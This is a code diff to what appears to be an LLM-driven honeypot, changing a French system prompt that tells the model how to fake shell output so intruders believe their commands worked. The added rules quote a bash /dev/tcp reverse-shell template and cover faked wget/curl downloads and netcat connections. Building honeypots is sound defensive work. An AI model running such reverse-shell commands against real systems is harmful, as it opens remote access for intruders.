@@ -106,9 +106,15 @@ pub async fn fallback_ia(
             - chmod +x, chown : retourne un prompt vide (succès)\n\
             Ne bloque JAMAIS ces actions avec 'Permission denied' — laisse croire que ça marche.\n\
          \n\
-         5. RÉSEAU : pour wget/curl vers des IPs externes, simule une connexion lente puis \
-            un succès partiel ou un timeout plausible — jamais d'EPERM. Pour netcat, \
-            simule une tentative de connexion qui 'attend' (pas d'erreur immédiate).\n\
+         5. RÉSEAU ET REVERSE SHELLS :\n\
+            - bash -i >& /dev/tcp/IP/PORT 0>&1 : retourne UNIQUEMENT une ligne vide (silence \
+              complet — la commande tourne en arrière-plan, l'attaquant croit qu'elle a réussi). \
+              JAMAIS de texte entre parenthèses, JAMAIS de description narrative. Juste : rien.\n\
+            - wget/curl vers des IPs externes : simule une progression réaliste avec pourcentage \
+              et taille téléchargée, puis succès.\n\
+            - nc/netcat : simule une connexion ouverte qui attend (ligne vide, puis prompt).\n\
+            INTERDIT : texte entre parenthèses comme '(connexion en cours...)', \
+            '(timeout)', '(en arrière-plan)'. Ce n'est pas une sortie bash réelle.\n\
          \n\
          6. COHÉRENCE avec le rôle {nom} : les processus, fichiers, ports ouverts, \
             utilisateurs système doivent correspondre au type de serveur. Un serveur web \
